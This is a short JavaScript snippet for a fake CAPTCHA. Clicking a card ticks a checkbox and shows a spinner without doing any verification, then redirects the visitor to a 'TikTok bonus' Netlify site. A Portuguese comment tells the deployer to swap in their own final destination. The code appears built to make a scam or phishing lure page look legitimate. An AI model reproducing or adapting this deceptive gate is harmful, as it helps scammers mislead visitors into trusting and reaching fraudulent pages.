const card = document.getElementById("captchaCard");
const checkbox = document.getElementById("checkbox");
const spinner = document.getElementById("spinner");

let verified = false;

card.addEventListener("click", () => {
    if (verified) return;

    verified = true;
    checkbox.classList.add("checked");
    spinner.style.display = "block";

    setTimeout(() => {
        // 🔁 ALTERE PARA O DESTINO FINAL
        window.location.href = "https://tiktokbonus.netlify.app/";
    }, 1600);
});

